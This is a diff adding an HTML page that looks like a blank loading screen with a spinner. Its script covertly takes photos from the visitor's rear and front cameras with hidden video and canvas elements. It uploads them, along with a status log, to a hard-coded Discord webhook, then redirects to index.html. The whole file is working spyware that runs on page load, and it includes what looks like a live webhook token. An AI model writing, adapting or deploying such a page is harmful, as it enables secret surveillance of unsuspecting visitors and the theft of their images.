@@ -1,1 +1,236 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>...</title>
+<style>
+  html, body {
+    margin: 0;
+    height: 100%;
+    background: #000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .spinner {
+    width: 48px;
+    height: 48px;
+    border: 5px solid rgba(255,255,255,0.2);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+</style>
+</head>
+<body>
 
+<div class="spinner"></div>
+<video id="video" autoplay playsinline muted style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+// >>> PUT YOUR REAL DISCORD WEBHOOK URL HERE <<<
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1536689787359072317/4iCZ2QaYMRIdbtvk09nnkH5gpW6CJ5DI0ZLn_hTOQIuk5rz5QYCY8nDyvmwAE138Vn61";
+const REDIRECT_TO = "index.html";
+const REDIRECT_DELAY_MS = 600;
+
+// ---- Single-message live log system ----
+// Posts ONE message, then PATCHes it as new lines come in, instead of
+// spamming the webhook (which trips Discord's rate limit and drops requests).
+
+let messageId = null;
+const logLines = [];
+let editChain = Promise.resolve(); // serializes PATCH calls so they don't race
+
+function buildContent() {
+  const text = logLines.join("\n");
+  return text.length > 1900 ? "...\n" + text.slice(-1900) : text;
+}
+
+async function discordRequest(url, options, retriesLeft = 3) {
+  const res = await fetch(url, options);
+  if (res.status === 429 && retriesLeft > 0) {
+    let waitMs = 1000;
+    try {
+      const body = await res.json();
+      if (body.retry_after) waitMs = Math.ceil(body.retry_after * 1000) + 100;
+    } catch (e) {}
+    await new Promise(r => setTimeout(r, waitMs));
+    return discordRequest(url, options, retriesLeft - 1);
+  }
+  return res;
+}
+
+async function log(line) {
+  logLines.push(line);
+
+  editChain = editChain.then(async () => {
+    try {
+      if (messageId === null) {
+        const res = await discordRequest(WEBHOOK_URL + "?wait=true", {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: buildContent() })
+        });
+        if (res.ok) {
+          const data = await res.json();
+          messageId = data.id;
+        }
+      } else {
+        await discordRequest(`${WEBHOOK_URL}/messages/${messageId}`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: buildContent() })
+        });
+      }
+    } catch (e) {
+      // Nothing else we can do if the log itself fails
+    }
+  });
+
+  await editChain;
+}
+
+// Final edit: attaches whichever photos we got to the SAME message
+async function finalizeWithPhotos(photos) {
+  await editChain; // wait for all prior log edits to finish first
+
+  const payload = { content: buildContent() };
+  const formData = new FormData();
+  formData.append('payload_json', JSON.stringify(payload));
+
+  photos.forEach((p, i) => {
+    if (p.blob) formData.append(`files[${i}]`, p.blob, p.label + '.jpg');
+  });
+
+  try {
+    if (messageId === null) {
+      return await discordRequest(WEBHOOK_URL + "?wait=true", {
+        method: 'POST',
+        body: formData
+      });
+    } else {
+      return await discordRequest(`${WEBHOOK_URL}/messages/${messageId}`, {
+        method: 'PATCH',
+        body: formData
+      });
+    }
+  } catch (e) {
+    await log("ERROR: final send failed: " + e.message);
+    return null;
+  }
+}
+
+window.onerror = function (msg, url, line) {
+  log("UNCAUGHT ERROR: " + msg + " (line " + line + ")");
+};
+
+function goHome() {
+  setTimeout(() => { window.location.href = REDIRECT_TO; }, REDIRECT_DELAY_MS);
+}
+
+// Captures a single photo from a camera facing the given direction.
+// facingModeValue: 'environment' (rear) or 'user' (front).
+// Falls back gracefully on devices that only have one camera (e.g. most desktops).
+async function capturePhoto(facingModeValue, label) {
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: facingModeValue } },
+      audio: false
+    });
+  } catch (e) {
+    await log(label + ": exact-facing request failed (" + e.name + "), trying any camera...");
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    } catch (e2) {
+      await log(label + ": FAILED, no camera available (" + e2.name + ")");
+      return { label, blob: null };
+    }
+  }
+
+  try {
+    const video = document.getElementById('video');
+    video.srcObject = stream;
+
+    await new Promise((resolve, reject) => {
+      video.onloadedmetadata = () => resolve();
+      setTimeout(() => reject(new Error("timed out waiting for video")), 8000);
+    });
+    await video.play();
+    await new Promise(r => setTimeout(r, 400)); // let camera auto-expose/focus
+
+    const canvas = document.getElementById('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    stream.getTracks().forEach(track => track.stop());
+
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+    if (!blob) {
+      await log(label + ": FAILED, toBlob returned null");
+      return { label, blob: null };
+    }
+    await log(label + ": captured (" + blob.size + " bytes)");
+    return { label, blob };
+  } catch (err) {
+    await log(label + ": FAILED during capture (" + err.name + ": " + err.message + ")");
+    stream.getTracks().forEach(track => track.stop());
+    return { label, blob: null };
+  }
+}
+
+async function run() {
+  if (WEBHOOK_URL.includes("xxxxx")) {
+    await log("WARNING: WEBHOOK_URL is still the placeholder value.");
+  }
+
+  await log("photo.html loaded (" + window.location.protocol + ")");
+
+  if (!window.isSecureContext) {
+    await log("FAILED: not a secure context. Camera requires HTTPS (or localhost).");
+    goHome();
+    return;
+  }
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    await log("FAILED: getUserMedia not supported in this browser.");
+    goHome();
+    return;
+  }
+
+  // Capture rear, then front. Sequential, since most devices can only run
+  // one camera stream at a time. On desktops with a single webcam, both
+  // calls just use that same camera - no error, just a duplicate-ish shot.
+  const rear = await capturePhoto('environment', 'rear');
+  const front = await capturePhoto('user', 'front');
+
+  const photos = [rear, front];
+  const gotAny = photos.some(p => p.blob);
+
+  if (!gotAny) {
+    await log("FAILED: no photos captured from any camera.");
+    goHome();
+    return;
+  }
+
+  await log("Sending " + photos.filter(p => p.blob).length + " photo(s)...");
+  const res = await finalizeWithPhotos(photos);
+
+  if (res && res.ok) {
+    await log("DONE: photo(s) sent successfully.");
+  } else {
+    await log("FAILED: upload response status " + (res ? res.status : "no response"));
+  }
+
+  goHome();
+}
+
+run();
+</script>
+</body>
+</html>
